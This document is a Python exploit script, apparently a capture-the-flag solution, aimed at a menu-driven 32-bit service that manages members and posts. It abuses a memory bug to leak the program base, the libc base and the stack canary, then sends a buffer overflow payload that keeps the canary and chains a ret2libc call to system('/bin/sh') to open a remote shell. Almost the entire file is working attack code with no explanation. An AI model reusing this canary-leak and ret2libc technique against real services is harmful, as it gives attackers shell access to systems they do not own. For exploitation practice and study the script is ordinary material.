#!/usr/bin/env python
# -*- coding: utf-8 -*-
import pwn
from pwnpwnpwn import *
import re

#host = "10.211.55.16"
#port = 8888


sock = make_conn(host,port)


def create_mem(sock,name,age,exp):
    recvuntil(sock,"Quit")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,name)
    recvuntil(sock,":")
    sendline(sock,str(age))
    recvuntil(sock,":")
    sendline(sock,str(exp))
    recvuntil(sock,"...")
    sendline(sock,"1")

def del_mem(sock,allmem=1,memid=0):
    recvuntil(sock,"Quit")
    sendline(sock,"3")
    recvuntil(sock,"(y/n)")
    if allmem :
        sendline(sock,"y")
    else :
        sendline(sock,"n")
        recvuntil(sock,":")
        sendline(sock,str(memid))

def create_post(sock,title,memid,category = 1,content = "aaaa"):
    recvuntil(sock,"Quit")
    sendline(sock,"5")
    recvuntil(sock,":")
    sendline(sock,title)
    recvuntil(sock,":")
    sendline(sock,str(memid))
    recvuntil(sock,"...")
    sendline(sock,str(category))
    recvuntil(sock,":")
    sendline(sock,content)

def list_mem(sock,allmem=1,memid=0):
    recvuntil(sock,"Quit")
    sendline(sock,"4")
    recvuntil(sock,"(y/n)")
    if allmem :
        sendline(sock,"y")
    else :
        sendline(sock,"n")
        recvuntil(sock,":")
        sendline(sock,str(memid))
    return recvuntil(sock,"Create")

def update_mem(sock,memid,name,age,exp,job=1):
    recvuntil(sock,"Quit")
    sendline(sock,"2")
    recvuntil(sock,":")
    sendline(sock,str(memid))
    recvuntil(sock,":")
    sendline(sock,name)
    recvuntil(sock,":")
    sendline(sock,str(age))
    recvuntil(sock,":")
    sendline(sock,str(exp))
    recvuntil(sock,"...")
    sendline(sock,str(job))

def list_post(sock,allpost=1,postid=0):
    recvuntil(sock,"Quit")
    sendline(sock,"8")
    recvuntil(sock,"(y/n)")
    if allpost :
        sendline(sock,"y")
    else :
        sendline(sock,"n")
        recvuntil(sock,":")
        sendline(sock,str(postid))
    return recvuntil(sock,"Create")

def leak(addr):
    global sock
    if addr > 0x7fffffff :
        addr = addr - 0x100000000
    update_mem(sock,10001,"tttt",addr,123)
    data = list_post(sock,0,20001)
    match = re.search("category.*",data)
    result = match.group()[11:15].ljust(4,'\x00')
    return result

#leak
for i in range(500):
    create_mem(sock,"aaaa",23,32)
del_mem(sock)
create_post(sock,"bbbb",0)
data = list_mem(sock,0,10001)
matchage = re.search("age.*",data)
matchexp = re.search("work.*",data)
codebase = int(matchage.group()[6:].strip()) + 0x100000000 - 0x357f
libcbase = int(matchexp.group()[18:-5].strip()) + 0x100000000 + 0xf9010
canaryaddr = libcbase - 0x1000 + 0x714
print "codebae : " + hex(codebase)
print "libcbase : " +  hex(libcbase)
print "canaryaddr : " + hex(canaryaddr)


update_mem(sock,10001,"tttt",canaryaddr-0x100000000+1,123)
data = list_post(sock,0,20001)
matchcanary = re.search("category.*",data)
canary = unpack32( '\x00'+ matchcanary.group()[11:14])
print "canary : " + hex(canary)

#d = pwn.DynELF(leak,libcbase+0x2000)
#system = d.lookup('system')

libcbase = libcbase + 0x1000
#system = libcbase + 0x3fcd0
system = libcbase + 0x40190
#binsh = libcbase + 0x15da84
binsh = libcbase + 0x160a24

print hex(system)
print hex(binsh)
#retlib
payload = "aaaabbbb"
payload += pack32(canary)
payload += pack32(0)*3
payload += pack32(system)
payload += pack32(0)
payload += pack32(binsh)
#print leak(libcbase)


recvuntil(sock,"Quit")
sendline(sock,"4")
recvuntil(sock,"(y/n)")
sendline(sock,payload)
recvuntil(sock,":")
sendline(sock,"1")
recvuntil(sock,"id")

print "pwn"
inter(sock)
